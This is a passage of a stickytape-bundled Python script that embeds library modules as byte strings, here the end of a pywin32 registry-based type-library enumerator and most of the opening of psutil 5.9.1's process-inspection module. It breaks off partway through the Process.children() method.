1\n\n    def FromTypelib(self, typelib, dllName=None):\n        la = typelib.GetLibAttr()\n        self.clsid = str(la[0])\n        self.lcid = la[1]\n        self.major = la[3]\n        self.minor = la[4]\n        if dllName:\n            self.dll = dllName\n\n\ndef EnumKeys(root):\n    index = 0\n    ret = []\n    while 1:\n        try:\n            item = win32api.RegEnumKey(root, index)\n        except win32api.error:\n            break\n        try:\n            # Note this doesn\'t handle REG_EXPAND_SZ, but the implementation\n            # here doesn\'t need to - that is handled as the data is read.\n            val = win32api.RegQueryValue(root, item)\n        except win32api.error:\n            val = ""  # code using this assumes a string.\n\n        ret.append((item, val))\n        index = index + 1\n    return ret\n\n\nFLAG_RESTRICTED = 1\nFLAG_CONTROL = 2\nFLAG_HIDDEN = 4\n\n\ndef EnumTlbs(excludeFlags=0):\n    """Return a list of TypelibSpec objects, one for each registered library."""\n    key = win32api.RegOpenKey(win32con.HKEY_CLASSES_ROOT, "Typelib")\n    iids = EnumKeys(key)\n    results = []\n    for iid, crap in iids:\n        try:\n            key2 = win32api.RegOpenKey(key, str(iid))\n        except win32api.error:\n            # A few good reasons for this, including "access denied".\n            continue\n        for version, tlbdesc in EnumKeys(key2):\n            major_minor = version.split(".", 1)\n            if len(major_minor) < 2:\n                major_minor.append("0")\n            # For some reason, this code used to assume the values were hex.\n            # This seems to not be true - particularly for CDO 1.21\n            # *sigh* - it appears there are no rules here at all, so when we need\n            # to know the info, we must load the tlb by filename and request it.\n            # The Resolve() method on the TypelibSpec does this.\n            # For this reason, keep the version numbers as strings - that\n            # way we can\'t be wrong!  Let code that really needs an int to work\n            # out what to do.  FWIW, http://support.microsoft.com/kb/816970 is\n            # pretty clear that they *should* be hex.\n            major = major_minor[0]\n            minor = major_minor[1]\n            key3 = win32api.RegOpenKey(key2, str(version))\n            try:\n                # The "FLAGS" are at this point\n                flags = int(win32api.RegQueryValue(key3, "FLAGS"))\n            except (win32api.error, ValueError):\n                flags = 0\n            if flags & excludeFlags == 0:\n                for lcid, crap in EnumKeys(key3):\n                    try:\n                        lcid = int(lcid)\n                    except ValueError:  # not an LCID entry\n                        continue\n                    # Check for both "{lcid}\\win32" and "{lcid}\\win64" keys.\n                    try:\n                        key4 = win32api.RegOpenKey(key3, "%s\\\\win32" % (lcid,))\n                    except win32api.error:\n                        try:\n                            key4 = win32api.RegOpenKey(key3, "%s\\\\win64" % (lcid,))\n                        except win32api.error:\n                            continue\n                    try:\n                        dll, typ = win32api.RegQueryValueEx(key4, None)\n                        if typ == win32con.REG_EXPAND_SZ:\n                            dll = win32api.ExpandEnvironmentStrings(dll)\n                    except win32api.error:\n                        dll = None\n                    spec = TypelibSpec(iid, lcid, major, minor, flags)\n                    spec.dll = dll\n                    spec.desc = tlbdesc\n                    spec.ver_desc = tlbdesc + " (" + version + ")"\n                    results.append(spec)\n    return results\n\n\ndef FindTlbsWithDescription(desc):\n    """Find all installed type libraries with the specified description"""\n    ret = []\n    items = EnumTlbs()\n    for item in items:\n        if item.desc == desc:\n            ret.append(item)\n    return ret\n\n\ndef SelectTlb(title="Select Library", excludeFlags=0):\n    """Display a list of all the type libraries, and select one.   Returns None if cancelled"""\n    import pywin.dialogs.list\n\n    items = EnumTlbs(excludeFlags)\n    # fixup versions - we assume hex (see __init__ above)\n    for i in items:\n        i.major = int(i.major, 16)\n        i.minor = int(i.minor, 16)\n    items.sort()\n    rc = pywin.dialogs.list.SelectFromLists(title, items, ["Type Library"])\n    if rc is None:\n        return None\n    return items[rc]\n\n\n# Test code.\nif __name__ == "__main__":\n    print(SelectTlb().__dict__)\n')
    __stickytape_write_module('psutil/__init__.py', b'# -*- coding: utf-8 -*-\n\n# Copyright (c) 2009, Giampaolo Rodola\'. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\n"""psutil is a cross-platform library for retrieving information on\nrunning processes and system utilization (CPU, memory, disks, network,\nsensors) in Python. Supported platforms:\n\n - Linux\n - Windows\n - macOS\n - FreeBSD\n - OpenBSD\n - NetBSD\n - Sun Solaris\n - AIX\n\nWorks with Python versions 2.7 and 3.4+.\n"""\n\nfrom __future__ import division\n\nimport collections\nimport contextlib\nimport datetime\nimport functools\nimport os\nimport signal\nimport subprocess\nimport sys\nimport threading\nimport time\n\n\ntry:\n    import pwd\nexcept ImportError:\n    pwd = None\n\nfrom . import _common\nfrom ._common import AIX\nfrom ._common import BSD\nfrom ._common import CONN_CLOSE\nfrom ._common import CONN_CLOSE_WAIT\nfrom ._common import CONN_CLOSING\nfrom ._common import CONN_ESTABLISHED\nfrom ._common import CONN_FIN_WAIT1\nfrom ._common import CONN_FIN_WAIT2\nfrom ._common import CONN_LAST_ACK\nfrom ._common import CONN_LISTEN\nfrom ._common import CONN_NONE\nfrom ._common import CONN_SYN_RECV\nfrom ._common import CONN_SYN_SENT\nfrom ._common import CONN_TIME_WAIT\nfrom ._common import FREEBSD  # NOQA\nfrom ._common import LINUX\nfrom ._common import MACOS\nfrom ._common import NETBSD  # NOQA\nfrom ._common import NIC_DUPLEX_FULL\nfrom ._common import NIC_DUPLEX_HALF\nfrom ._common import NIC_DUPLEX_UNKNOWN\nfrom ._common import OPENBSD  # NOQA\nfrom ._common import OSX  # deprecated alias\nfrom ._common import POSIX  # NOQA\nfrom ._common import POWER_TIME_UNKNOWN\nfrom ._common import POWER_TIME_UNLIMITED\nfrom ._common import STATUS_DEAD\nfrom ._common import STATUS_DISK_SLEEP\nfrom ._common import STATUS_IDLE\nfrom ._common import STATUS_LOCKED\nfrom ._common import STATUS_PARKED\nfrom ._common import STATUS_RUNNING\nfrom ._common import STATUS_SLEEPING\nfrom ._common import STATUS_STOPPED\nfrom ._common import STATUS_TRACING_STOP\nfrom ._common import STATUS_WAITING\nfrom ._common import STATUS_WAKING\nfrom ._common import STATUS_ZOMBIE\nfrom ._common import SUNOS\nfrom ._common import WINDOWS\nfrom ._common import AccessDenied\nfrom ._common import Error\nfrom ._common import NoSuchProcess\nfrom ._common import TimeoutExpired\nfrom ._common import ZombieProcess\nfrom ._common import memoize_when_activated\nfrom ._common import wrap_numbers as _wrap_numbers\nfrom ._compat import PY3 as _PY3\nfrom ._compat import PermissionError\nfrom ._compat import ProcessLookupError\nfrom ._compat import SubprocessTimeoutExpired as _SubprocessTimeoutExpired\nfrom ._compat import long\n\n\nif LINUX:\n    # This is public API and it will be retrieved from _pslinux.py\n    # via sys.modules.\n    PROCFS_PATH = "/proc"\n\n    from . import _pslinux as _psplatform\n    from ._pslinux import IOPRIO_CLASS_BE  # NOQA\n    from ._pslinux import IOPRIO_CLASS_IDLE  # NOQA\n    from ._pslinux import IOPRIO_CLASS_NONE  # NOQA\n    from ._pslinux import IOPRIO_CLASS_RT  # NOQA\n\nelif WINDOWS:\n    from . import _pswindows as _psplatform\n    from ._psutil_windows import ABOVE_NORMAL_PRIORITY_CLASS  # NOQA\n    from ._psutil_windows import BELOW_NORMAL_PRIORITY_CLASS  # NOQA\n    from ._psutil_windows import HIGH_PRIORITY_CLASS  # NOQA\n    from ._psutil_windows import IDLE_PRIORITY_CLASS  # NOQA\n    from ._psutil_windows import NORMAL_PRIORITY_CLASS  # NOQA\n    from ._psutil_windows import REALTIME_PRIORITY_CLASS  # NOQA\n    from ._pswindows import CONN_DELETE_TCB  # NOQA\n    from ._pswindows import IOPRIO_HIGH  # NOQA\n    from ._pswindows import IOPRIO_LOW  # NOQA\n    from ._pswindows import IOPRIO_NORMAL  # NOQA\n    from ._pswindows import IOPRIO_VERYLOW  # NOQA\n\nelif MACOS:\n    from . import _psosx as _psplatform\n\nelif BSD:\n    from . import _psbsd as _psplatform\n\nelif SUNOS:\n    from . import _pssunos as _psplatform\n    from ._pssunos import CONN_BOUND  # NOQA\n    from ._pssunos import CONN_IDLE  # NOQA\n\n    # This is public writable API which is read from _pslinux.py and\n    # _pssunos.py via sys.modules.\n    PROCFS_PATH = "/proc"\n\nelif AIX:\n    from . import _psaix as _psplatform\n\n    # This is public API and it will be retrieved from _pslinux.py\n    # via sys.modules.\n    PROCFS_PATH = "/proc"\n\nelse:  # pragma: no cover\n    raise NotImplementedError(\'platform %s is not supported\' % sys.platform)\n\n\n__all__ = [\n    # exceptions\n    "Error", "NoSuchProcess", "ZombieProcess", "AccessDenied",\n    "TimeoutExpired",\n\n    # constants\n    "version_info", "__version__",\n\n    "STATUS_RUNNING", "STATUS_IDLE", "STATUS_SLEEPING", "STATUS_DISK_SLEEP",\n    "STATUS_STOPPED", "STATUS_TRACING_STOP", "STATUS_ZOMBIE", "STATUS_DEAD",\n    "STATUS_WAKING", "STATUS_LOCKED", "STATUS_WAITING", "STATUS_LOCKED",\n    "STATUS_PARKED",\n\n    "CONN_ESTABLISHED", "CONN_SYN_SENT", "CONN_SYN_RECV", "CONN_FIN_WAIT1",\n    "CONN_FIN_WAIT2", "CONN_TIME_WAIT", "CONN_CLOSE", "CONN_CLOSE_WAIT",\n    "CONN_LAST_ACK", "CONN_LISTEN", "CONN_CLOSING", "CONN_NONE",\n    # "CONN_IDLE", "CONN_BOUND",\n\n    "AF_LINK",\n\n    "NIC_DUPLEX_FULL", "NIC_DUPLEX_HALF", "NIC_DUPLEX_UNKNOWN",\n\n    "POWER_TIME_UNKNOWN", "POWER_TIME_UNLIMITED",\n\n    "BSD", "FREEBSD", "LINUX", "NETBSD", "OPENBSD", "MACOS", "OSX", "POSIX",\n    "SUNOS", "WINDOWS", "AIX",\n\n    # "RLIM_INFINITY", "RLIMIT_AS", "RLIMIT_CORE", "RLIMIT_CPU", "RLIMIT_DATA",\n    # "RLIMIT_FSIZE", "RLIMIT_LOCKS", "RLIMIT_MEMLOCK", "RLIMIT_NOFILE",\n    # "RLIMIT_NPROC", "RLIMIT_RSS", "RLIMIT_STACK", "RLIMIT_MSGQUEUE",\n    # "RLIMIT_NICE", "RLIMIT_RTPRIO", "RLIMIT_RTTIME", "RLIMIT_SIGPENDING",\n\n    # classes\n    "Process", "Popen",\n\n    # functions\n    "pid_exists", "pids", "process_iter", "wait_procs",             # proc\n    "virtual_memory", "swap_memory",                                # memory\n    "cpu_times", "cpu_percent", "cpu_times_percent", "cpu_count",   # cpu\n    "cpu_stats",  # "cpu_freq", "getloadavg"\n    "net_io_counters", "net_connections", "net_if_addrs",           # network\n    "net_if_stats",\n    "disk_io_counters", "disk_partitions", "disk_usage",            # disk\n    # "sensors_temperatures", "sensors_battery", "sensors_fans"     # sensors\n    "users", "boot_time",                                           # others\n]\n\n\n__all__.extend(_psplatform.__extra__all__)\n\n# Linux, FreeBSD\nif hasattr(_psplatform.Process, "rlimit"):\n    # Populate global namespace with RLIM* constants.\n    from . import _psutil_posix\n\n    _globals = globals()\n    _name = None\n    for _name in dir(_psutil_posix):\n        if _name.startswith(\'RLIM\') and _name.isupper():\n            _globals[_name] = getattr(_psutil_posix, _name)\n            __all__.append(_name)\n    del _globals, _name\n\nAF_LINK = _psplatform.AF_LINK\n\n__author__ = "Giampaolo Rodola\'"\n__version__ = "5.9.1"\nversion_info = tuple([int(num) for num in __version__.split(\'.\')])\n\n_timer = getattr(time, \'monotonic\', time.time)\n_TOTAL_PHYMEM = None\n_LOWEST_PID = None\n_SENTINEL = object()\n\n# Sanity check in case the user messed up with psutil installation\n# or did something weird with sys.path. In this case we might end\n# up importing a python module using a C extension module which\n# was compiled for a different version of psutil.\n# We want to prevent that by failing sooner rather than later.\n# See: https://github.com/giampaolo/psutil/issues/564\nif (int(__version__.replace(\'.\', \'\')) !=\n        getattr(_psplatform.cext, \'version\', None)):\n    msg = "version conflict: %r C extension module was built for another " \\\n          "version of psutil" % getattr(_psplatform.cext, "__file__")\n    if hasattr(_psplatform.cext, \'version\'):\n        msg += " (%s instead of %s)" % (\n            \'.\'.join([x for x in str(_psplatform.cext.version)]), __version__)\n    else:\n        msg += " (different than %s)" % __version__\n    msg += "; you may try to \'pip uninstall psutil\', manually remove %s" % (\n        getattr(_psplatform.cext, "__file__",\n                "the existing psutil install directory"))\n    msg += " or clean the virtual env somehow, then reinstall"\n    raise ImportError(msg)\n\n\n# =====================================================================\n# --- Utils\n# =====================================================================\n\n\nif hasattr(_psplatform, \'ppid_map\'):\n    # Faster version (Windows and Linux).\n    _ppid_map = _psplatform.ppid_map\nelse:  # pragma: no cover\n    def _ppid_map():\n        """Return a {pid: ppid, ...} dict for all running processes in\n        one shot. Used to speed up Process.children().\n        """\n        ret = {}\n        for pid in pids():\n            try:\n                ret[pid] = _psplatform.Process(pid).ppid()\n            except (NoSuchProcess, ZombieProcess):\n                pass\n        return ret\n\n\ndef _assert_pid_not_reused(fun):\n    """Decorator which raises NoSuchProcess in case a process is no\n    longer running or its PID has been reused.\n    """\n    @functools.wraps(fun)\n    def wrapper(self, *args, **kwargs):\n        if not self.is_running():\n            if self._pid_reused:\n                msg = "process no longer exists and its PID has been reused"\n            else:\n                msg = None\n            raise NoSuchProcess(self.pid, self._name, msg=msg)\n        return fun(self, *args, **kwargs)\n    return wrapper\n\n\ndef _pprint_secs(secs):\n    """Format seconds in a human readable form."""\n    now = time.time()\n    secs_ago = int(now - secs)\n    if secs_ago < 60 * 60 * 24:\n        fmt = "%H:%M:%S"\n    else:\n        fmt = "%Y-%m-%d %H:%M:%S"\n    return datetime.datetime.fromtimestamp(secs).strftime(fmt)\n\n\n# =====================================================================\n# --- Process class\n# =====================================================================\n\n\nclass Process(object):\n    """Represents an OS process with the given PID.\n    If PID is omitted current process PID (os.getpid()) is used.\n    Raise NoSuchProcess if PID does not exist.\n\n    Note that most of the methods of this class do not make sure\n    the PID of the process being queried has been reused over time.\n    That means you might end up retrieving an information referring\n    to another process in case the original one this instance\n    refers to is gone in the meantime.\n\n    The only exceptions for which process identity is pre-emptively\n    checked and guaranteed are:\n\n     - parent()\n     - children()\n     - nice() (set)\n     - ionice() (set)\n     - rlimit() (set)\n     - cpu_affinity (set)\n     - suspend()\n     - resume()\n     - send_signal()\n     - terminate()\n     - kill()\n\n    To prevent this problem for all other methods you can:\n     - use is_running() before querying the process\n     - if you\'re continuously iterating over a set of Process\n       instances use process_iter() which pre-emptively checks\n     process identity for every yielded instance\n    """\n\n    def __init__(self, pid=None):\n        self._init(pid)\n\n    def _init(self, pid, _ignore_nsp=False):\n        if pid is None:\n            pid = os.getpid()\n        else:\n            if not _PY3 and not isinstance(pid, (int, long)):\n                raise TypeError(\'pid must be an integer (got %r)\' % pid)\n            if pid < 0:\n                raise ValueError(\'pid must be a positive integer (got %s)\'\n                                 % pid)\n        self._pid = pid\n        self._name = None\n        self._exe = None\n        self._create_time = None\n        self._gone = False\n        self._pid_reused = False\n        self._hash = None\n        self._lock = threading.RLock()\n        # used for caching on Windows only (on POSIX ppid may change)\n        self._ppid = None\n        # platform-specific modules define an _psplatform.Process\n        # implementation class\n        self._proc = _psplatform.Process(pid)\n        self._last_sys_cpu_times = None\n        self._last_proc_cpu_times = None\n        self._exitcode = _SENTINEL\n        # cache creation time for later use in is_running() method\n        try:\n            self.create_time()\n        except AccessDenied:\n            # We should never get here as AFAIK we\'re able to get\n            # process creation time on all platforms even as a\n            # limited user.\n            pass\n        except ZombieProcess:\n            # Zombies can still be queried by this class (although\n            # not always) and pids() return them so just go on.\n            pass\n        except NoSuchProcess:\n            if not _ignore_nsp:\n                raise NoSuchProcess(pid, msg=\'process PID not found\')\n            else:\n                self._gone = True\n        # This pair is supposed to indentify a Process instance\n        # univocally over time (the PID alone is not enough as\n        # it might refer to a process whose PID has been reused).\n        # This will be used later in __eq__() and is_running().\n        self._ident = (self.pid, self._create_time)\n\n    def __str__(self):\n        info = collections.OrderedDict()\n        info["pid"] = self.pid\n        if self._name:\n            info[\'name\'] = self._name\n        with self.oneshot():\n            try:\n                info["name"] = self.name()\n                info["status"] = self.status()\n            except ZombieProcess:\n                info["status"] = "zombie"\n            except NoSuchProcess:\n                info["status"] = "terminated"\n            except AccessDenied:\n                pass\n            if self._exitcode not in (_SENTINEL, None):\n                info["exitcode"] = self._exitcode\n            if self._create_time:\n                info[\'started\'] = _pprint_secs(self._create_time)\n            return "%s.%s(%s)" % (\n                self.__class__.__module__,\n                self.__class__.__name__,\n                ", ".join(["%s=%r" % (k, v) for k, v in info.items()]))\n\n    __repr__ = __str__\n\n    def __eq__(self, other):\n        # Test for equality with another Process object based\n        # on PID and creation time.\n        if not isinstance(other, Process):\n            return NotImplemented\n        return self._ident == other._ident\n\n    def __ne__(self, other):\n        return not self == other\n\n    def __hash__(self):\n        if self._hash is None:\n            self._hash = hash(self._ident)\n        return self._hash\n\n    @property\n    def pid(self):\n        """The process PID."""\n        return self._pid\n\n    # --- utility methods\n\n    @contextlib.contextmanager\n    def oneshot(self):\n        """Utility context manager which considerably speeds up the\n        retrieval of multiple process information at the same time.\n\n        Internally different process info (e.g. name, ppid, uids,\n        gids, ...) may be fetched by using the same routine, but\n        only one information is returned and the others are discarded.\n        When using this context manager the internal routine is\n        executed once (in the example below on name()) and the\n        other info are cached.\n\n        The cache is cleared when exiting the context manager block.\n        The advice is to use this every time you retrieve more than\n        one information about the process. If you\'re lucky, you\'ll\n        get a hell of a speedup.\n\n        >>> import psutil\n        >>> p = psutil.Process()\n        >>> with p.oneshot():\n        ...     p.name()  # collect multiple info\n        ...     p.cpu_times()  # return cached value\n        ...     p.cpu_percent()  # return cached value\n        ...     p.create_time()  # return cached value\n        ...\n        >>>\n        """\n        with self._lock:\n            if hasattr(self, "_cache"):\n                # NOOP: this covers the use case where the user enters the\n                # context twice:\n                #\n                # >>> with p.oneshot():\n                # ...    with p.oneshot():\n                # ...\n                #\n                # Also, since as_dict() internally uses oneshot()\n                # I expect that the code below will be a pretty common\n                # "mistake" that the user will make, so let\'s guard\n                # against that:\n                #\n                # >>> with p.oneshot():\n                # ...    p.as_dict()\n                # ...\n                yield\n            else:\n                try:\n                    # cached in case cpu_percent() is used\n                    self.cpu_times.cache_activate(self)\n                    # cached in case memory_percent() is used\n                    self.memory_info.cache_activate(self)\n                    # cached in case parent() is used\n                    self.ppid.cache_activate(self)\n                    # cached in case username() is used\n                    if POSIX:\n                        self.uids.cache_activate(self)\n                    # specific implementation cache\n                    self._proc.oneshot_enter()\n                    yield\n                finally:\n                    self.cpu_times.cache_deactivate(self)\n                    self.memory_info.cache_deactivate(self)\n                    self.ppid.cache_deactivate(self)\n                    if POSIX:\n                        self.uids.cache_deactivate(self)\n                    self._proc.oneshot_exit()\n\n    def as_dict(self, attrs=None, ad_value=None):\n        """Utility method returning process information as a\n        hashable dictionary.\n        If *attrs* is specified it must be a list of strings\n        reflecting available Process class\' attribute names\n        (e.g. [\'cpu_times\', \'name\']) else all public (read\n        only) attributes are assumed.\n        *ad_value* is the value which gets assigned in case\n        AccessDenied or ZombieProcess exception is raised when\n        retrieving that particular process information.\n        """\n        valid_names = _as_dict_attrnames\n        if attrs is not None:\n            if not isinstance(attrs, (list, tuple, set, frozenset)):\n                raise TypeError("invalid attrs type %s" % type(attrs))\n            attrs = set(attrs)\n            invalid_names = attrs - valid_names\n            if invalid_names:\n                raise ValueError("invalid attr name%s %s" % (\n                    "s" if len(invalid_names) > 1 else "",\n                    ", ".join(map(repr, invalid_names))))\n\n        retdict = dict()\n        ls = attrs or valid_names\n        with self.oneshot():\n            for name in ls:\n                try:\n                    if name == \'pid\':\n                        ret = self.pid\n                    else:\n                        meth = getattr(self, name)\n                        ret = meth()\n                except (AccessDenied, ZombieProcess):\n                    ret = ad_value\n                except NotImplementedError:\n                    # in case of not implemented functionality (may happen\n                    # on old or exotic systems) we want to crash only if\n                    # the user explicitly asked for that particular attr\n                    if attrs:\n                        raise\n                    continue\n                retdict[name] = ret\n        return retdict\n\n    def parent(self):\n        """Return the parent process as a Process object pre-emptively\n        checking whether PID has been reused.\n        If no parent is known return None.\n        """\n        lowest_pid = _LOWEST_PID if _LOWEST_PID is not None else pids()[0]\n        if self.pid == lowest_pid:\n            return None\n        ppid = self.ppid()\n        if ppid is not None:\n            ctime = self.create_time()\n            try:\n                parent = Process(ppid)\n                if parent.create_time() <= ctime:\n                    return parent\n                # ...else ppid has been reused by another process\n            except NoSuchProcess:\n                pass\n\n    def parents(self):\n        """Return the parents of this process as a list of Process\n        instances. If no parents are known return an empty list.\n        """\n        parents = []\n        proc = self.parent()\n        while proc is not None:\n            parents.append(proc)\n            proc = proc.parent()\n        return parents\n\n    def is_running(self):\n        """Return whether this process is running.\n        It also checks if PID has been reused by another process in\n        which case return False.\n        """\n        if self._gone or self._pid_reused:\n            return False\n        try:\n            # Checking if PID is alive is not enough as the PID might\n            # have been reused by another process: we also want to\n            # verify process identity.\n            # Process identity / uniqueness over time is guaranteed by\n            # (PID + creation time) and that is verified in __eq__.\n            self._pid_reused = self != Process(self.pid)\n            return not self._pid_reused\n        except ZombieProcess:\n            # We should never get here as it\'s already handled in\n            # Process.__init__; here just for extra safety.\n            return True\n        except NoSuchProcess:\n            self._gone = True\n            return False\n\n    # --- actual API\n\n    @memoize_when_activated\n    def ppid(self):\n        """The process parent PID.\n        On Windows the return value is cached after first call.\n        """\n        # On POSIX we don\'t want to cache the ppid as it may unexpectedly\n        # change to 1 (init) in case this process turns into a zombie:\n        # https://github.com/giampaolo/psutil/issues/321\n        # http://stackoverflow.com/questions/356722/\n\n        # XXX should we check creation time here rather than in\n        # Process.parent()?\n        if POSIX:\n            return self._proc.ppid()\n        else:  # pragma: no cover\n            self._ppid = self._ppid or self._proc.ppid()\n            return self._ppid\n\n    def name(self):\n        """The process name. The return value is cached after first call."""\n        # Process name is only cached on Windows as on POSIX it may\n        # change, see:\n        # https://github.com/giampaolo/psutil/issues/692\n        if WINDOWS and self._name is not None:\n            return self._name\n        name = self._proc.name()\n        if POSIX and len(name) >= 15:\n            # On UNIX the name gets truncated to the first 15 characters.\n            # If it matches the first part of the cmdline we return that\n            # one instead because it\'s usually more explicative.\n            # Examples are "gnome-keyring-d" vs. "gnome-keyring-daemon".\n            try:\n                cmdline = self.cmdline()\n            except AccessDenied:\n                pass\n            else:\n                if cmdline:\n                    extended_name = os.path.basename(cmdline[0])\n                    if extended_name.startswith(name):\n                        name = extended_name\n        self._name = name\n        self._proc._name = name\n        return name\n\n    def exe(self):\n        """The process executable as an absolute path.\n        May also be an empty string.\n        The return value is cached after first call.\n        """\n        def guess_it(fallback):\n            # try to guess exe from cmdline[0] in absence of a native\n            # exe representation\n            cmdline = self.cmdline()\n            if cmdline and hasattr(os, \'access\') and hasattr(os, \'X_OK\'):\n                exe = cmdline[0]  # the possible exe\n                # Attempt to guess only in case of an absolute path.\n                # It is not safe otherwise as the process might have\n                # changed cwd.\n                if (os.path.isabs(exe) and\n                        os.path.isfile(exe) and\n                        os.access(exe, os.X_OK)):\n                    return exe\n            if isinstance(fallback, AccessDenied):\n                raise fallback\n            return fallback\n\n        if self._exe is None:\n            try:\n                exe = self._proc.exe()\n            except AccessDenied as err:\n                return guess_it(fallback=err)\n            else:\n                if not exe:\n                    # underlying implementation can legitimately return an\n                    # empty string; if that\'s the case we don\'t want to\n                    # raise AD while guessing from the cmdline\n                    try:\n                        exe = guess_it(fallback=exe)\n                    except AccessDenied:\n                        pass\n                self._exe = exe\n        return self._exe\n\n    def cmdline(self):\n        """The command line this process has been called with."""\n        return self._proc.cmdline()\n\n    def status(self):\n        """The process current status as a STATUS_* constant."""\n        try:\n            return self._proc.status()\n        except ZombieProcess:\n            return STATUS_ZOMBIE\n\n    def username(self):\n        """The name of the user that owns the process.\n        On UNIX this is calculated by using *real* process uid.\n        """\n        if POSIX:\n            if pwd is None:\n                # might happen if python was installed from sources\n                raise ImportError(\n                    "requires pwd module shipped with standard python")\n            real_uid = self.uids().real\n            try:\n                return pwd.getpwuid(real_uid).pw_name\n            except KeyError:\n                # the uid can\'t be resolved by the system\n                return str(real_uid)\n        else:\n            return self._proc.username()\n\n    def create_time(self):\n        """The process creation time as a floating point number\n        expressed in seconds since the epoch.\n        The return value is cached after first call.\n        """\n        if self._create_time is None:\n            self._create_time = self._proc.create_time()\n        return self._create_time\n\n    def cwd(self):\n        """Process current working directory as an absolute path."""\n        return self._proc.cwd()\n\n    def nice(self, value=None):\n        """Get or set process niceness (priority)."""\n        if value is None:\n            return self._proc.nice_get()\n        else:\n            if not self.is_running():\n                raise NoSuchProcess(self.pid, self._name)\n            self._proc.nice_set(value)\n\n    if POSIX:\n\n        @memoize_when_activated\n        def uids(self):\n            """Return process UIDs as a (real, effective, saved)\n            namedtuple.\n            """\n            return self._proc.uids()\n\n        def gids(self):\n            """Return process GIDs as a (real, effective, saved)\n            namedtuple.\n            """\n            return self._proc.gids()\n\n        def terminal(self):\n            """The terminal associated with this process, if any,\n            else None.\n            """\n            return self._proc.terminal()\n\n        def num_fds(self):\n            """Return the number of file descriptors opened by this\n            process (POSIX only).\n            """\n            return self._proc.num_fds()\n\n    # Linux, BSD, AIX and Windows only\n    if hasattr(_psplatform.Process, "io_counters"):\n\n        def io_counters(self):\n            """Return process I/O statistics as a\n            (read_count, write_count, read_bytes, write_bytes)\n            namedtuple.\n            Those are the number of read/write calls performed and the\n            amount of bytes read and written by the process.\n            """\n            return self._proc.io_counters()\n\n    # Linux and Windows\n    if hasattr(_psplatform.Process, "ionice_get"):\n\n        def ionice(self, ioclass=None, value=None):\n            """Get or set process I/O niceness (priority).\n\n            On Linux *ioclass* is one of the IOPRIO_CLASS_* constants.\n            *value* is a number which goes from 0 to 7. The higher the\n            value, the lower the I/O priority of the process.\n\n            On Windows only *ioclass* is used and it can be set to 2\n            (normal), 1 (low) or 0 (very low).\n\n            Available on Linux and Windows > Vista only.\n            """\n            if ioclass is None:\n                if value is not None:\n                    raise ValueError("\'ioclass\' argument must be specified")\n                return self._proc.ionice_get()\n            else:\n                return self._proc.ionice_set(ioclass, value)\n\n    # Linux / FreeBSD only\n    if hasattr(_psplatform.Process, "rlimit"):\n\n        def rlimit(self, resource, limits=None):\n            """Get or set process resource limits as a (soft, hard)\n            tuple.\n\n            *resource* is one of the RLIMIT_* constants.\n            *limits* is supposed to be a (soft, hard) tuple.\n\n            See "man prlimit" for further info.\n            Available on Linux and FreeBSD only.\n            """\n            return self._proc.rlimit(resource, limits)\n\n    # Windows, Linux and FreeBSD only\n    if hasattr(_psplatform.Process, "cpu_affinity_get"):\n\n        def cpu_affinity(self, cpus=None):\n            """Get or set process CPU affinity.\n            If specified, *cpus* must be a list of CPUs for which you\n            want to set the affinity (e.g. [0, 1]).\n            If an empty list is passed, all egible CPUs are assumed\n            (and set).\n            (Windows, Linux and BSD only).\n            """\n            if cpus is None:\n                return sorted(set(self._proc.cpu_affinity_get()))\n            else:\n                if not cpus:\n                    if hasattr(self._proc, "_get_eligible_cpus"):\n                        cpus = self._proc._get_eligible_cpus()\n                    else:\n                        cpus = tuple(range(len(cpu_times(percpu=True))))\n                self._proc.cpu_affinity_set(list(set(cpus)))\n\n    # Linux, FreeBSD, SunOS\n    if hasattr(_psplatform.Process, "cpu_num"):\n\n        def cpu_num(self):\n            """Return what CPU this process is currently running on.\n            The returned number should be <= psutil.cpu_count()\n            and <= len(psutil.cpu_percent(percpu=True)).\n            It may be used in conjunction with\n            psutil.cpu_percent(percpu=True) to observe the system\n            workload distributed across CPUs.\n            """\n            return self._proc.cpu_num()\n\n    # All platforms has it, but maybe not in the future.\n    if hasattr(_psplatform.Process, "environ"):\n\n        def environ(self):\n            """The environment variables of the process as a dict.  Note: this\n            might not reflect changes made after the process started.  """\n            return self._proc.environ()\n\n    if WINDOWS:\n\n        def num_handles(self):\n            """Return the number of handles opened by this process\n            (Windows only).\n            """\n            return self._proc.num_handles()\n\n    def num_ctx_switches(self):\n        """Return the number of voluntary and involuntary context\n        switches performed by this process.\n        """\n        return self._proc.num_ctx_switches()\n\n    def num_threads(self):\n        """Return the number of threads used by this process."""\n        return self._proc.num_threads()\n\n    if hasattr(_psplatform.Process, "threads"):\n\n        def threads(self):\n            """Return threads opened by process as a list of\n            (id, user_time, system_time) namedtuples representing\n            thread id and thread CPU times (user/system).\n            On OpenBSD this method requires root access.\n            """\n            return self._proc.threads()\n\n    @_assert_pid_not_reused\n    def children(self, recursive=False):\n        """Return the children of this process as a list of Process\n        instances, pre-emptively checking whether PID has been reused.\n        If *recursive* is True return all the parent descendants.\n\n        Example (A == this process):\n\n         A \xe2\x94\x80\xe2\x94\x90\n            \xe2\x94\x82\n            \xe2\x94\x9c\xe2\x94\x80 B (child) \xe2\x94\x80\xe2\x94\x90\n            \xe2\x94\x82             \xe2\x94\x94\xe2\x94\x80 X (grandchild) \xe2\x94\x80\xe2\x94\x90\n            \xe2\x94\x82                                \xe2\x94\x94\xe2\x94\x80 Y (great grandchild)\n            \xe2\x94\x9c\xe2\x94\x80 C (child)\n            \xe2\x94\x94\xe2\x94\x80 D (child)\n\n        >>> import psutil\n        >>> p = psutil.Process()\n        >>> p.children()\n        B, C, D\n        >>> p.children(recursive=True)\n        B, X, Y, C, D\n\n        Note that in the example above if process X disappears\n        process Y won\'t be listed as the reference to process A\n        is lost.\n        """\n        ppid_map = _ppid_map()\n        ret = []\n        if not recursive:\n            for pid, ppid in ppid_map.items():\n                if ppid == self.pid:\n                    try:\n                        child = Process(pid)\n                        # if child happens to be older than its parent\n                        # (self) it means child\'s PID has been reused\n                        if self.create_time() <= child.create_time():\n                            ret.append(child)\n                    except (NoSuchProcess, ZombieProcess):\n                        pass\n        else:\n            # Construct a {pid: [child pids]} dict\n            reverse_ppid_map = collections.defaultdict(list)\n            for pid, ppid in ppid_map.items():\n                reverse_ppid_map[ppid].append(pid)\n            # Recursively traverse that dict, starting from self.pid,\n            # such that we only call Process() on actual children\n            seen = set()\n            stack = [self.pid]\n            while stack:\n                pid = stack.pop()\n                if pid in seen:\n                    # Since pids can be reused while 